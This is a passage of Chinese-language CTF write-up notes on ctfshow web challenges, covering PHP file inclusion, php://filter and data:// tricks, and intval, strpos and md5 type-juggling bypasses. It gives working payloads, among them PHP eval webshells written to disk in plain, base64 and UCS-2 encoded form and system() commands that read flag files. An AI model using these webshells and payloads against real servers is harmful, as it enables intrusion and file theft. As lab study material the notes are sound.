
若使用hackbar则查看页面源码

<strong>法二</strong>：

直接传递一句话木马 <span style="color: rgb(216, 59, 100)"><strong>`<?=eval($_POST['hi']);`</strong></span> 。


```php
<?=eval($_POST['hi']);
base64 编码：
PD89ZXZhbCgkX1BPU1RbJ2hpJ10pOw==
```


传递 file 参数与 content 参数，content 需要添加两个字母凑数，这里添加 aa。


```php
url + ?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%31%25%33%32%25%33%33%25%32%65%25%37%30%25%36%38%25%37%30

content=aaPD89ZXZhbCgkX1BPU1RbJ2hpJ10pOw==
```



![](/article-assets/2025/ctfshow-web-notes/images/screenshot-073.webp)

蚁剑连接 123.php 即可。


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-074.webp)

<strong>法三</strong>：

<strong>?file=php://filter/write=string.rot13/resource=2.php</strong>

对伪代码进行url全编码两次

同时post

<strong>content=`<?php system('tac f*.php');?>`</strong>

对php代码进行rot13编码即可

最后访问2.php

这题不知道为什么传 content 参数时，php 语句不要加末尾的 “ ?> ”。可能什么地方出了问题。

<strong>原理</strong>

+ file_put_contents(filename, data)：将数据写入文件。
+ urldecode()：解码已编码的 URL 字符串。

[谈一谈php://filter的妙用](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)

### web88

![](/article-assets/2025/ctfshow-web-notes/images/screenshot-075.webp)

过滤了 “ = ” 号，如果构造命令时，base64 编码出现 “ = ”，可以尝试在后面加空格，避免等号出现。

构造 <span style="color: rgb(216, 59, 100)"><strong>`<?php system('cat f*.php');?>`</strong></span> 。在语句后添加<span style="color: #DF2A3F">空格</span>避免出现等号。


```php
<?php system('cat f*.php');?> 
base64 编码：
PD9waHAgc3lzdGVtKCdjYXQgZioucGhwJyk7Pz4g
```


<strong>解</strong>：


```php
url + ?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZioucGhwJyk7Pz4g
```


传参后查看源码即可

### web116
发现是一段视频

下载视频，使用 [<span style="color: rgb(252, 85, 49)">010editor</span>](https://so.csdn.net/so/search?q=010editor&spm=1001.2101.3001.7020) 打开，发现存在 png 图片的数据


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-076.webp)

提取：


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-077.webp)

另存为 png 格式的图片：


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-078.webp)

打开发现是一段代码：


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-079.webp)

以 [<span style="color: rgb(252, 85, 49)">get</span>](https://so.csdn.net/so/search?q=get&spm=1001.2101.3001.7020) 方式给 file 传参进行文件包含，猜测是 flag.php，payload：


```php
?file=flag.php
```


将hackbar右边模式设置为RAW 随后提交<strong>URL+?file=flag.php</strong>

### web117


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-080.webp)

需要在绕过 filter 函数过滤的基础上，再来绕过死亡函数。base64、rot13、string 这些都被过滤了，果然尝试前面的方法，发现不行，因为正则匹配是针对 url 解码后的内容进行的。


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-081.webp)

把一句话木马从 UCS-2LE 编码转换为 UCS-2BE 编码：


```php
<?php
$re = iconv("UCS-2LE","UCS-2BE", '<?php @eval($_GET[1]);?>');
echo $re;
?>
```


运行得到：


```php
?<hp pe@av(l_$EG[T]1;)>?
```



```php
post 传入：
contents=?<hp pe@av(l_$EG[T]1;)>?
paload：
?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=hack.php
```



![](/article-assets/2025/ctfshow-web-notes/images/screenshot-082.webp)

之后调用 hack.php：


```php
/hack.php?1=system('ls');
```



![](/article-assets/2025/ctfshow-web-notes/images/screenshot-083.webp)

读取 flag：


```php
/hack.php?1=system('tac flag.php');
```


拿到 flag

因为我们传入的一句话木马是先经过一遍编码转换的，之后又通过过滤器将其还原。


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-084.webp)

而题目自己添加进去的 `<?php die();?>` 则会被过滤器转换成无法识别的文本内容，导致无法执行。


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-085.webp)

我们可以来看一下 hack.php 的内容：


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-086.webp)

?<hp pid(e;)>? 肯定无法正常被解析为 php 代码，也就不会执行，而我们的一句话木马 `<?php @eval($_GET[1]);?>` 是正常的，因此可以被调用。


## web入门--PHP特性题解
### PHP函数说明
#### <strong>preg_match()</strong>
+ <strong>preg_match()  
</strong>执行匹配正则表达式。只能处理字符串，所以当传入数组时会返回 false。

#### <strong>intval(value)</strong>
+ <strong>intval(value)  
</strong>用于获取变量的整数值。成功时返回 value 的 integer 值，失败时返回 0。空的数组返回 0，非空的数组返回 1。
+ <strong>intval(mixed \$value, int \$base = 10)  
</strong>通过使用指定的进制 base 转换（默认是十进制），返回变量 value 的 int 数值。

<strong>如果 base 是 0，通过检测 value 的格式来决定使用的进制：</strong>

+ <strong>如果字符串包括了 "0x"（或 "0X"）的前缀，使用 16 进制（hex）</strong>
+ <strong>如果字符串以 "0" 开始，使用 8 进制（octal）</strong>
+ <strong>否则将使用 10 进制（decimal）。</strong>

intval() 还有一个特性。输入的值如果是字符串，它返回的内容取决于第一个字符左侧的数字。如 intval(‘11a22’)=11。

#### strpos()
+ strpos()  
查找字符串首次出现的位置。字符串位置是从0开始。

<strong>`strpos($num, "0")`</strong><strong> 的含义</strong>

+ `strpos($num, "0")`：在字符串 `$num` 中查找字符 `"0"`。
    - 如果找到 `"0"`，返回<strong>其位置</strong>（如 `0`、`1`、`2` 等）。
    - 如果未找到 `"0"`，返回 `false`。
+ `!strpos($num, "0")`：对 `strpos` 的结果取逻辑非。
    - 如果 `strpos` 返回 `false`（即未找到 `"0"`），`!strpos` 为 `true`。
    - 如果 `strpos` 返回一个整数（即找到 `"0"`），`!strpos` 为 `false`。

#### md5()
用于计算字符串的 <strong>MD5 哈希值</strong>。

<strong>函数定义</strong>


```php
string md5(string $str, bool $raw_output = false)
```


MD5 碰撞指的是 <strong>两个不同的输入，MD5 哈希值相同</strong>，即：

MD5(A)=MD5(B),A!=B

| 输入 | MD5 哈希值 |
| :---: | :---: |
| `A` | `098f6bcd4621d373cade4e832627b4f6` |
| `B` | `098f6bcd4621d373cade4e832627b4f6` |


这就违反了哈希函数的 <strong>抗碰撞性</strong>，即 <strong>不同的数据应该有不同的哈希值</strong>。

<strong>参数</strong>

1. <strong>`$str`</strong>：
    - 类型：`string`
    - 说明：需要计算 MD5 哈希值的字符串。
2. <strong>`$raw_output`</strong>：
    - 类型：`bool`
    - 说明：是否返回原始二进制数据。
        * 如果为 `true`(默认值），返回长度为 32 的十六进制字符串。

<strong>返回值</strong>

+ 返回一个 32 字符的十六进制字符串（默认），或 16 字节的二进制字符串（当 `$raw_output` 为 `true` 时）。


#### in_array()
+ <strong>in_array()</strong> 函数特性：第三个参数没有设置的时候，为弱类型比较。例如比较 1.php 时会自动转换为 1 再比较。

#### <strong>array_push()</strong>
+ <strong>array_push()</strong>：向尾部插入元素。

#### in_array()
+ <strong>in_array()</strong>：检查数组中是否存在指定值。
+ in_array函数的漏洞：  

![](/article-assets/2025/ctfshow-web-notes/images/screenshot-087.webp)

#### file_put_contents()
+ <strong>file_put_contents()</strong>：将字符串写入文件。

#### call_user_func()
+ <strong>call_user_func()</strong>：用于调用方法或者变量，第一个参数是被调用的函数，第二个是调用的函数的参数

#### file_put_contents()
+ <strong>file_put_contents()</strong>：写入内容到文件中，第一个参数是文件名，第二个参数是内容

#### hex2bin()
+ <strong>hex2bin()</strong>：把十六进制值的字符串转换为 ASCII 字符（十六进制转二进制）。

#### sha1()
+ <strong>sha1()</strong>：计算字符串的 sha1 散列值。

#### die()
+ <span style="color: rgb(214, 51, 132)">`die()`</span>函数虽然会终止程序，但同时也会输出括号内的终止提示信息

#### parse_str(string,array):
+ parse_str(string,array)：把查询字符串解析到变量中。

#### ereg():
+ ereg()：用于执行正则表达式匹配。
+ ereg 函数存在 NULL 截断漏洞，可以绕过正则过滤，使用 %00 截断。

#### strrev():
+ strrev()：反转字符串。

#### strim():
`string trim ( string $str [, string $character_mask = " \t\n\r\0\x0B" ] )`

此函数返回字符串 `str` 去除首尾空白字符后的结果。如果不指定第二个参数，`trim()` 将去除这些字符：

+ `" "` (ASCII 32 (0x20))，普通空格符。
+ `"\t"` (ASCII 9 (0x09))，制表符。
+ `"\n"` (ASCII 10 (0x0A))，换行符。
+ `"\r"` (ASCII 13 (0x0D))，回车符。
+ `"\0"` (ASCII 0 (0x00))，空字节符。
+ `"\x0B"` (ASCII 11 (0x0B))，垂直制表符。
![](/article-assets/2025/ctfshow-web-notes/images/screenshot-088.webp)

#### assert():
+ assert(mixed \$assertion, string \$description = ?):<strong>参数</strong>：
    - `$assertion`：要检查的表达式或条件。如果是一个字符串，它会被当作 PHP 代码执行。
    - `$description`（可选）：如果断言失败，输出的描述信息。
+ <strong>返回值</strong>：
    - 如果 `$assertion` 为 `true`，返回 `true`。
    - 如果 `$assertion` 为 `false`，返回 `false`，并触发一个警告或错误。

#### extract():
+ 是 PHP 中的一个函数，用于将数组中的键值对提取为变量。
+ 它的作用是将数组的键名作为变量名，数组的值作为变量的值。
+ <strong>extract(\$_GET)</strong>直接将 `$_GET` 超全局数组中的键值对提取为变量。


<details>
<summary>补充</summary>

`extract($_GET)` 会直接将 URL 参数转换为变量。如果用户传递了一个与已有变量同名的参数，会导致变量被覆盖。例如：

```plain
$isAdmin = false;

// 用户访问：https://example.com/?isAdmin=true
extract($_GET);

echo $isAdmin; // 输出: true
```


</details>


#### call_user_func():
+ `call_user_func()` 是 PHP 中的一个内置函数，用于动态调用函数或方法。它允许你在运行时根据变量值调用函数，而不是在代码中硬编码函数名。

##### 代码解释

```php
php
$f1 = $_GET['f1'];
$f2 = $_GET['f2'];
var_dump(call_user_func(call_user_func($f1, $f2)));
```


解释

+ 它接受两个参数：
    - 第一个参数是要调用的函数名（或可调用对象）。
    - 第二个参数是传递给该函数的参数。
+ 例如，如果`$f1 = "strlen"`且`$f2 = "hello"`，则：


```php
call_user_func("strlen", "hello");
```


相当于调用 `strlen("hello")`，返回 `5`。

#### gettext()  /  _():
+ <strong>gettext():</strong>获取的文本框当前输入内容的方法，返回内容。`_()`是gettext函数的简写形式，需要php扩展目录下有php_gettext.dll才能使用。

#### get_defined_vars():
+ <strong>`get_defined_vars():`</strong>返回由所有已定义变量所组成的数组。

#### stripos():
+ `stripos()`: 是大小写不敏感的字符串查找函数，返回子字符串首次出现的位置（从 0 开始）。

其作用有提取子字符串


```php
$substring = substr($str, 0, 5); // 提取 "Hello"
```


，查找子字符串，


```php
$position = strpos($str, "World"); // 查找 "World" 的位置
```


替换子字符串，


```php
$newStr = str_replace("World", "PHP", $str); // 将 "World" 替换为 "PHP"
```


检查子字符串是否存在


```php
if (strpos($str, "World") !== false)
```


#### substr():
+ `substr()`: 是 PHP 中的一个字符串处理函数，用于<strong>截取字符串的一部分</strong>。它可以根据指定的起始位置和长度，从原字符串中提取子字符串。
+ 通常为两个参数，第一个参数表示截取位置，第二个参数表示截取个数

#### parse_str():
<strong>parse_str():</strong>是对get请求进行的内容解析成变量。例如传递`?a=1`，执行后就是`$a=1`。

#### intval():
`intval($code)` 会将 `$code` 转换为整数，因此需要构造 `$code` 的值，使其转换为整数后与 `'ctfshow'` 相等。

  
 

### web89

![](/article-assets/2025/ctfshow-web-notes/images/screenshot-089.webp)

+ <strong>preg_match()  
执行匹配正则表达式。只能处理字符串，所以当传入数组时会返回 false。</strong>
+ <strong>intval(value)  
用于获取变量的整数值。成功时返回 value 的 integer 值，失败时返回 0。空的数组返回 0，非空的数组返回 1。</strong>

所以这题传个数组就行。


```php
url + ?num[]=1
```


### web90

```php
include("flag.php");//包含一个名为 flag.php 的文件，该文件可能定义了 $flag 变量，存储了需要保护的敏感信息（如 flag）。
highlight_file(__FILE__);//显示当前文件的源代码。
if(isset($_GET['num'])) 
  //检查 URL 中是否传递了 num 参数（例如：?num=1234）。
//如果存在，将其值赋给变量 $num。
{
    $num = $_GET['num'];
    if($num=="4476") 
    {
        die("no no no!");
    }
    if(intval($num,0)==4476) 
      //使用 intval($num, 0) 将 $num 转换为整数。
      //如果转换后的整数等于 4476，则输出 $flag。
      //否则，输出 $num 转换后的整数值。
    {
        echo $flag;
    }
    else
    {
        echo intval($num,0);
    }
}
```


<strong>如何绕过检查</strong>

+ 传递一个非 `"4476"` 的字符串，但该字符串在转换为整数时等于 `4476`。例如：
    - 十六进制：`0x117c`
    - 八进制：`010574`


<details>
<summary>intval(\$num, 0)解释</summary>

#### `intval($num, 0)`<strong>的含义</strong>

- `$num`：需要转换为整数的变量。
- `0`：表示进制基数为 `0`，此时 `intval()` 会根据 `$num` 的格式自动推断进制：

- 如果 `$num` 以 `0x` 或 `0X` 开头，则按 <strong>十六进制</strong> 解析。
- 如果 `$num` 以 `0` 开头，则按 <strong>八进制</strong> 解析。
- 否则，按 <strong>十进制</strong> 解析。

</details>


答案：

<strong>?num=0x117c		或	      ?num=010574		或		?num=4476a</strong>

### web91

```php
show_source(__FILE__);
include('flag.php');
$a = $_GET['cmd'];
if (preg_match('/php$/im', $a)) 
{
    if (preg_match('/php$/i', $a)) 
    {
        echo 'hacker';
    } 
    else 
    {
        echo $flag;
    }
} 
else 
{
    echo 'nonononono';
}
```



<details>
<summary>代码解释</summary>

- 使用 `preg_match` 函数对 `$a` 进行正则表达式匹配。
- 第一个正则表达式 `/php$/im`：

- `php$`：匹配以 `php` 结尾的字符串。
- `i`：不区分大小写。
- `m`：多行模式。

- 第二个正则表达式 `/php$/i`：

- `php$`：匹配以 `php` 结尾的字符串。
- `i`：不区分大小写。

1. <strong>条件判断</strong>：

- 如果 `$a` 以 `php` 结尾（不区分大小写，多行模式），则进入内部判断：

- 如果 `$a` 以 `php` 结尾（不区分大小写），输出 `'hacker'`。
- 否则，输出 `$flag`。

- 如果 `$a` 不以 `php` 结尾，输出 `'nonononono'`。

#### <strong>代码逻辑</strong>

- 目标是让 `$a` 以 `php` 结尾，但仅在多行模式下匹配，而在单行模式下不匹配。
- 这意味着需要传递一个字符串，该字符串在多行模式下以 `php` 结尾，但在单行模式下不以 `php` 结尾。

</details>


经过代码解释后 可通过换行符来绕过检查

如：<strong>?cmd=test%0aphp</strong>

正则表达式：


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-090.webp)

参考文章：[换行解析漏洞(CVE-2017-15715)](https://blog.csdn.net/qq_46091464/article/details/108278486)

### web92

```php
include("flag.php");
highlight_file(__FILE__);
if (isset($_GET['num'])) 
{
    $num = $_GET['num'];
    if ($num == 4476) 
    {
        die("no no no!");
    }
    if (intval($num, 0) == 4476) 
    {
        echo $flag;
    } 
    else 
    {
        echo intval($num, 0);
    }
}
```


注意：

php 中 <span style="color: rgb(216, 59, 100)"><strong>`==`</strong></span> 与 <span style="color: rgb(216, 59, 100)"><strong>`===`</strong></span> 的区别

两个等号是<strong>先把等号两边的变量转化成相同的类型</strong>，如果转换类型后的结果是相等的，就认为相等。

三个等号是<strong>先判断两边变量的数据类型</strong>，如果数据类型相同，再去判断两边的值，如果值相等，那么为真。

#### <strong>如何绕过检查</strong>
1. <strong>使用其他进制的表示</strong>：
    - 例如，`4476` 的十六进制表示为 `0x117c`，八进制表示为 `010574`。
    - 传递 `num=0x117c` 或 `num=010574`，`intval($num, 0)` 会将其转换为十进制 `4476`。
2. <strong>示例 URL</strong>：
    - `url?num=0x117c`
    - `url?num=010574`

<strong>法二：</strong>

php有个特殊的字母：e，可以表示科学计数法。  
但是当intval()读取到e的时候就会停止。

url + ?num=4476e123

### web93

```php
include("flag.php");
highlight_file(__FILE__);
if (isset($_GET['num'])) {
    $num = $_GET['num'];
    if ($num == 4476) {
        die("no no no!");
    }
    if (preg_match("/[a-z]/i", $num)) {
        die("no no no!");
    }
    if (intval($num, 0) == 4476) {
        echo $flag;
    } else {
        echo intval($num, 0);
    }
}
```


<strong>代码逻辑</strong>

+ 目标是让 `intval($num, 0)` 的结果等于 `4476`，但 `$num` 的值不能直接是 `4476`，也不能包含字母。
+ 这意味着需要传递一个不包含字母且转换为整数后等于 `4476` 的字符串。

<strong>如何绕过检查</strong>

1. <strong>使用其他进制的表示</strong>：
    - 例如，`4476` 的十六进制表示为 `0x117c`，八进制表示为 `010574`。
    - 传递 `num=0x117c` 或 `num=010574`，`intval($num, 0)` 会将其转换为十进制 `4476`。
2. <strong>示例 URL</strong>：
    - `?num=0x117c`
    - `?num=010574`
+ PHP 的 `intval` 函数会将其识别为 16 进制数，并忽略 `0x` 前缀。

### web94

```php
include("flag.php");
highlight_file(__FILE__);
if (isset($_GET['num'])) {
    $num = $_GET['num'];
    if ($num ==="4476") {
        die("no no no!");
    }
    if (preg_match("/[a-z]/i", $num)) {
        die("no no no!");
    }
    if (!strpos($num, "0")) {
        die("no no no!");
    }
    if (intval($num, 0) == 4476) {
        echo $flag;
    }
}
```


<strong>代码解释</strong>

1. <strong>第三个条件判断</strong>：
        * `if (!strpos($num, "0")) { die("no no no!"); }`：使用 `strpos` 函数检查 `$num` 中是否包含字符 `"0"`。
        * `strpos($num, "0")`：在字符串 `$num` 中查找字符 `"0"`。
            + 如果找到 `"0"`，返回它的位置（如 `0`、`1`、`2` 等）。
            + 如果没找到 `"0"`，返回 `false`。
        * 如果 `strpos($num, "0")` 返回 `false`（即 `"0"` 不存在），`!strpos` 为 `true`，输出 `"no no no!"` 并终止脚本。

<strong>代码逻辑</strong>

+ 目标是让 `intval($num, 0)` 的结果等于 `4476`，但 `$num` 的值不能直接是字符串 `"4476"`，不能包含字母，且必须包含字符 `"0"`。
+ 这意味着需要传递一个不包含字母、包含 `"0"` 且转换为整数后等于 `4476` 的字符串。

<strong>绕过方式</strong>

<strong>法一：</strong>

开头不能为0

在8进制010574的基础上，增加一个空格即可绕过

 Payload：<strong>?num=%20010574</strong>

<strong>法二：</strong>

<strong>?num=4476%0a0</strong>

<strong>法三：</strong>

<strong>?num=4476.0</strong>

### web95

```php
include("flag.php");
highlight_file(__FILE__);
if (isset($_GET['num'])) {
    $num = $_GET['num'];
    if ($num == 4476) {
        die("no no no!");
    }
    if (preg_match("/[a-z]|\./i", $num)) {
        die("no no no!");
    }
    if (!strpos($num, "0")) {
        die("no no no!");
    }
    if (intval($num, 0) == 4476) {
        echo $flag;
    }
}
```


<strong>代码逻辑</strong>

+ 目标是让 `intval($num, 0)` 的结果等于 `4476`，但 `$num` 的值不能直接是 `4476`，不能包含字母或小数点，且必须包含字符 `"0"`。
+ 这意味着需要传递一个不包含字母(即科学计数法)或小数点、包含 `"0"` 且转换为整数后等于 `4476` 的字符串。

<strong>绕过方式</strong>

可以使用 8 进制绕过。<strong>  
</strong>可以通过加号或者空格绕过限制条件。

<strong>?num=+010574</strong>

或将+改为

+ `%09`：水平制表符（Tab）。
+ `%20`：空格（Space）。
+ `%0a`：换行符（Line Feed）。

### web96

```php
highlight_file(__FILE__);

if (isset($_GET['u'])) {
    if ($_GET['u'] == 'flag.php') {
        die("no no no");
    } else {
        highlight_file($_GET['u']);
      //如果 u 参数的值不是 "flag.php"，
      //则使用 highlight_file 函数显示 u 参数指定的文件内容。


    }
}
```


<strong>代码逻辑</strong>

+ 如果传递 `u=flag.php`，脚本会输出 `"no no no"` 并终止。
+ 如果传递其他文件名（如 `u=example.php`），脚本会尝试显示该文件的内容。

目标是读取 `flag.php`，可以通过以下方式绕过检查：

+ 使用 URL 编码：`u=%66%6c%61%67%2e%70%68%70`（`flag.php` 的 URL 编码）。
+ 使用路径遍历：<strong>`?u=./flag.php`</strong> 或<strong>`?u=/var/www/html/flag.php`</strong>。

### web97

```php
include("flag.php");
highlight_file(__FILE__);
if (isset($_POST['a']) and isset($_POST['b'])) {
    if ($_POST['a'] != $_POST['b'])
        if (md5($_POST['a']) === md5($_POST['b']))
          //如果 a 和 b 的 MD5 哈希值相等，输出 $flag。
            echo $flag;
        else
            print 'Wrong.';
}
```


<strong>代码逻辑</strong>

+ 目标是让 `a` 和 `b` 的值不相等，但它们的 MD5 哈希值相等。
+ 如果满足条件，输出 `$flag`；否则，输出 `'Wrong.'`。

<strong>绕过方法</strong>

数组绕过：

法一：POST提交

根据题目，PHP md5() 函数如果传入数组，返回值将是 NULL，所以可以用数组绕过。

<strong>a`[]`=1&b`[]`=2</strong>

法二：

1. <strong>使用 MD5 碰撞</strong>：

传递以下 POST 数据：


```php
a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
&b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
```



### 未web98

```php
include("flag.php");
$GET ? $_GET = &$_POST : 'flag';
$_GET['flag'] == 'flag' ? $_GET = &$_COOKIE : 'flag';
$_GET['flag'] == 'flag' ? $_GET = &$_SERVER : 'flag';
highlight_file($_GET['HTTP_FLAG'] == 'flag' ? $flag : __FILE__);
```


<strong>解析</strong>


```php
$_GET?$_GET=&$_POST:'flag';
/*
三元运算符。
$_GET 变量是一个数组，内容是 GET 方法发送的变量名称和值，类似于字典。
如果 $_GET 变量不为空，则 $_GET 变量和 $_POST 变量指向同一个地址，即$_POST 变量内容会影响 $_GET 变量的内容。
如果 $_GET 变量为空，整个三元表达式的结果为 ’flag’。
*/

$_GET['flag']=='flag'?$_GET=&$_COOKIE:'flag';
/*
如果 flag 变量值为 ’flag’，则 $_GET 变量和 $_COOKIE 变量指向同一个地址；
否则返回flag。
*/

$_GET['flag']=='flag'?$_GET=&$_SERVER:'flag';
/*
如果flag变量值为’flag’，则 $_GET 变量和 $_SERVER 变量指向同一个地址；
否则返回flag。
*/

highlight_file($_GET['HTTP_FLAG']=='flag'?$flag:__FILE__);
/*
如果 HTTP_FLAG 变量值为 ’flag’，输出 $flag，否则输出当前文件。
*/
```



<details>
<summary>代码解释</summary>

#### <strong>代码解释</strong>

1. <strong>包含文件</strong>：

- `include("flag.php");`：包含一个名为 `flag.php` 的文件，该文件可能定义了 `$flag` 变量，存储了需要保护的敏感信息（如 flag）。

2. <strong>条件赋值</strong>：

- `$GET ? $_GET = &$_POST : 'flag';`：如果 `$GET` 变量存在且为真，将 `$_GET` 赋值为 `$_POST` 的引用；否则，返回字符串 `'flag'`。
- `$_GET['flag'] == 'flag' ? $_GET = &$_COOKIE : 'flag';`：如果 `$_GET['flag']` 的值等于 `'flag'`，将 `$_GET` 赋值为 `$_COOKIE` 的引用；否则，返回字符串 `'flag'`。
- `$_GET['flag'] == 'flag' ? $_GET = &$_SERVER : 'flag';`：如果 `$_GET['flag']` 的值等于 `'flag'`，将 `$_GET` 赋值为 `$_SERVER` 的引用；否则，返回字符串 `'flag'`。

3. <strong>高亮显示文件</strong>：

- `highlight_file($_GET['HTTP_FLAG'] == 'flag' ? $flag : __FILE__);`：如果 `$_GET['HTTP_FLAG']` 的值等于 `'flag'`，显示 `$flag` 的内容；否则，显示当前文件的源代码。

</details>


<strong>代码逻辑</strong>

+ 代码通过一系列条件赋值操作，动态改变 `$_GET` 的引用。
+ 最终根据 `$_GET['HTTP_FLAG']` 的值决定显示 `$flag` 还是当前文件的源代码

<strong>绕过方法</strong>

1. <strong>设置 </strong><strong>`$_GET['HTTP_FLAG']`</strong>：
    - 通过POST 方法传递 `HTTP_FLAG=flag`，使 `$_GET['HTTP_FLAG']` 的值等于 `'flag'`，从而输出 `$flag`。
2. <strong>示例 URL</strong>：
    - `?HTTP_FLAG=flag`  -->GET随便传参如?1=1
    - 重点：POST要同时传参<strong>HTTP_FLAG=flag</strong>

### web99

```php
highlight_file(__FILE__);
$allow = array();
for ($i=36; $i < 0x36d; $i++) {
    array_push($allow, rand(1,$i));
}
if (isset($_GET['n']) && in_array($_GET['n'], $allow)) {
    file_put_contents($_GET['n'], $_POST['content']);
}
```



<details>
<summary>代码解释</summary>

1. <strong>高亮显示当前文件</strong>：

- `highlight_file(__FILE__);`：显示当前文件的源代码（用于调试或展示）。

2. <strong>生成随机数组</strong>：

- `$allow = array();`：初始化一个空数组 `$allow`。
- `for ($i=36; $i < 0x36d; $i++) { array_push($allow, rand(1,$i)); }`：循环从 `36` 到 `0x36d`（即 `877`），每次生成一个 `1` 到 `$i` 之间的随机数，并将其添加到 `$allow` 数组中。

3. <strong>检查</strong>`n`<strong>参数</strong>：

- `if (isset($_GET['n']) && in_array($_GET['n'], $allow)) { ... }`：检查是否通过 GET 方法传递了 `n` 参数，并且该参数的值是否在 `$allow` 数组中。
- 如果满足条件，继续执行后续逻辑。

4. <strong>写入文件</strong>：

- `file_put_contents($_GET['n'], $_POST['content']);`：将 `content` 参数的内容写入 `n` 参数指定的文件中。

</details>


+ <strong>array_push()</strong>：向尾部插入元素。
+ <strong>in_array()</strong>：检查数组中是否存在指定值。
+ <strong>file_put_contents()</strong>：将字符串写入文件。

<strong>in_array()</strong> 函数特性：第三个参数没有设置的时候，为弱类型比较。例如比较 1.php 时会自动转换为 1 再比较。

所以这题通过 GET 传递值来命名 PHP 文件，再通过 POST 传递 webshell 写入文件。之后访问此 webshell 即可。

<strong>代码逻辑</strong>

+ 生成一个包含随机数的数组 `$allow`。
+ 如果 `n` 参数的值在 `$allow` 数组中，将 `content` 参数的内容写入 `n` 参数指定的文件中。

<strong>绕过方式</strong>

get 传参：

<strong>url + ?n=23.php</strong>

post 传参：

<strong>content=`<?php eval($_POST[1]);?>`</strong>

随后再访问23.php


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-091.webp)表示写入


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-092.webp)

以此访问即可

<strong>补充</strong>

首先是尝试通过index.php中的代码创建一个25.php文件（文件名只要是大于1小于\$i的值就可以），内容为一句话。（可以通过bp的intruder模块来快速发包完成文件创建）。 然后访问25.php文件，提供相关命令。例如，如果一句话为：<span style="color: rgb(214, 51, 132)">`eval($_GET[a]);`</span>(自己补全,平台不让发一句话全码)，则访问25.php时带的参数就为<span style="color: rgb(214, 51, 132)">`?a=system('ls');`</span>发现flag36d文件后，调整参数内容为<span style="color: rgb(214, 51, 132)">`system('cat flag36d.php');`</span>

### web100

```php
highlight_file(__FILE__);
include("ctfshow.php");
//flag in class ctfshow;
$ctfshow = new ctfshow();
$v1 = $_GET['v1'];
$v2 = $_GET['v2'];
$v3 = $_GET['v3'];
$v0 = is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
if ($v0) {
    if (!preg_match("/\;/", $v2)) {
        if (preg_match("/\;/", $v3)) {
            eval("$v2('ctfshow')$v3");
        }
    }
}
```


<strong>特性：赋值【=】的优先级高于逻辑运算。所以只要让 </strong><span style="color: rgb(216, 59, 100)"><strong>`is_numeric($v1)`</strong></span><strong> 返回 true 即可满足 if 判断。</strong>


<details>
<summary>代码解释</summary>

1. <strong>高亮显示当前文件</strong>：

- `highlight_file(__FILE__);`：显示当前文件的源代码（用于调试或展示）。

2. <strong>包含文件</strong>：

- `include("ctfshow.php");`：包含一个名为 `ctfshow.php` 的文件，该文件可能定义了 `ctfshow` 类。

3. <strong>实例化类</strong>：

- `$ctfshow = new ctfshow();`：实例化 `ctfshow` 类。

4. <strong>获取 GET 参数</strong>：

- `$v1 = $_GET['v1'];`：获取 `v1` 参数的值。
- `$v2 = $_GET['v2'];`：获取 `v2` 参数的值。
- `$v3 = $_GET['v3'];`：获取 `v3` 参数的值。

5. <strong>检查参数是否为数字</strong>：

- `$v0 = is_numeric($v1) and is_numeric($v2) and is_numeric($v3);`：检查 `v1`、`v2` 和 `v3` 是否为数字。
- 如果都是数字，`$v0` 为 `true`。
- <strong>特性：赋值【=】的优先级高于逻辑运算。所以只要让</strong> `is_numeric($v1)` <strong>返回 true 即可满足 if 判断。</strong>

6. <strong>条件判断</strong>：

- `if ($v0) { ... }`：如果 `$v0` 为 `true`，继续执行后续逻辑。
- `if (!preg_match("/\;/", $v2)) { ... }`：如果 `v2` 中不包含分号`;`，继续执行后续逻辑。
- `if (preg_match("/\;/", $v3)) { ... }`：如果 `v3` 中包含分号`:`，执行 `eval("$v2('ctfshow')$v3");`。

7. <strong>执行动态代码</strong>：

- `eval("$v2('ctfshow')$v3");`：将 `$v2` 和 `$v3` 拼接成 PHP 代码并执行。

</details>


<strong>代码逻辑</strong>

+ 检查 `v1`、`v2` 和 `v3` 是否为数字。
+ 如果 `v2` 中不包含分号 `;`，且 `v3` 中包含分号 `;`，执行 `eval("$v2('ctfshow')$v3");`。

<strong>?v1=1&v2=system("ls")/*&v3=*/;</strong>

该答案是想

+ `eval("$v2('ctfshow')$v3");` 会被替换为：
+ eval("system('ls')/*('ctfshow')*/;");

### web101

```php
highlight_file(__FILE__);
include("ctfshow.php");
//flag in class ctfshow;
$ctfshow = new ctfshow();
